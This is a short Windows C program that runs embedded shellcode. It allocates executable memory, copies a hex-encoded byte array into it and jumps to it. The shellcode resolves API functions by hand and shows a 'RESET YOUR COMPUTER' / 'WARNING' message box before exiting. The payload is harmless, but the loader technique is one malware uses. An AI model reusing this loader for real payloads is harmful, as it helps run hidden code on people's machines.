#include <Windows.h>

int main() {
	unsigned char scode[] =
		"\x53\x56\x33\xc9\x64\x8b\x41\x30\x8b\x40\xc\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x3\xd3\x8b\x52\x78\x3\xd3\x8b\x72\x20\x3\xf3\x33\xc9\x41\xad\x3"
		"\xc3\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x4\x72\x6f\x63\x41\x75\xeb\x81\x78\x8\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x3\xf3\x66\x8b\xc\x4e\x49\x8b\x72\x1c"
		"\x3\xf3\x8b\x14\x8e\x3\xd3\x33\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\xc\x59\x50\x51\x66\xb9\x6c"
		"\x6c\x51\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x4\x33\xc9\x51\xb9\x6f\x78\x41\x61\x51\x83\x6c\x24\x3\x61\x68\x61\x67\x65"
		"\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd2\x83\xc4\x10\x68\x49\x4e\x47\x0\x68\x57\x41\x52\x4e\x68\x54\x45\x52\x0\x68\x4f\x4d\x50\x55\x68\x55\x52\x20\x43\x68\x54"
		"\x20\x59\x4f\x68\x52\x45\x53\x45\x33\xc9\x51\x8d\x4c\x24\x18\x51\x8d\x4c\x24\x8\x51\x33\xc9\x51\xff\xd0\x83\xc4\x20\x5a\x5b\xb9\x65\x73\x73\x61\x51\x83\x6c\x24"
		"\x3\x61\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x53\xff\xd2\x33\xc9\x51\xff\xd0\x5e\x5b\xc3\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc";
	
	void* exec = VirtualAlloc(0, sizeof scode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, scode, sizeof scode);
	((void(*)())exec)();

	return 0;
}